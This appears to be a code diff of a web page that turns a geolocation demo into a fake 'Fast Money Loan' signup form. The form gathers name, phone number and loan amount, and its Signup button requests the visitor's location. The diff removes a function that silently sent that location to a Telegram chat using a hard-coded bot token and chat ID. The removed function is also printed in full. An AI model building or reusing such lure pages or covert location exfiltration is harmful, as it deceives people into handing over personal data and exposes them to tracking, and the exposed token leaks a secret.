@@ -1,12 +1,82 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Geolocation</title>
+    <title>Fast Money Loan - Sign Up</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        #signup-form {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        label {
+            font-weight: bold;
+        }
+
+        input[type="text"],
+        input[type="number"] {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4caf50;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        #location {
+            margin-top: 15px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Geolocation Example</h1>
-    <button onclick="getLocation()">Get Location</button>
-    <p id="location"></p>
+    <div id="signup-form">
+        <h1>Fast Money Loan - Sign Up</h1>
+        <form>
+            <label for="name">Name:</label>
+            <input type="text" id="name" name="name" placeholder="Your Name" required>
+
+            <label for="phone">Phone Number:</label>
+            <input type="text" id="phone" name="phone" placeholder="Your Phone Number" required>
+
+            <label for="amount">Loan Amount:</label>
+            <input type="number" id="amount" name="amount" placeholder="Loan Amount (USD)" required>
+
+            <button onclick="getLocation()">Signup</button>
+
+            <p id="location"></p>
+        </form>
+    </div>
     
     <script>
         function getLocation() {
@@ -24,8 +94,7 @@
             "Latitude: " + latitude + 
             "<br>Longitude: " + longitude;
 
-            // Send location to Telegram bot
-            sendLocationToTelegram(latitude, longitude);
+            // You can include additional logic here to submit the form data along with the location
         }
 
         function showError(error) {
@@ -43,20 +112,6 @@
                     document.getElementById("location").innerHTML = "An unknown error occurred.";
                     break;
             }
-        }
-
-        function sendLocationToTelegram(latitude, longitude) {
-            var botToken = '7395889656:AAEM67vs5lE1xRGWyTCBCb06GOFx9VkIFUg';
-            var chatId = '-1002148840772';
-            var message = `User location: Latitude: ${latitude}, Longitude: ${longitude}`;
-
-            // URL to send message to Telegram chat
-            var telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            // Create a new XMLHttpRequest object
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", telegramUrl, true);
-            xhr.send();
         }
     </script>
 </body>
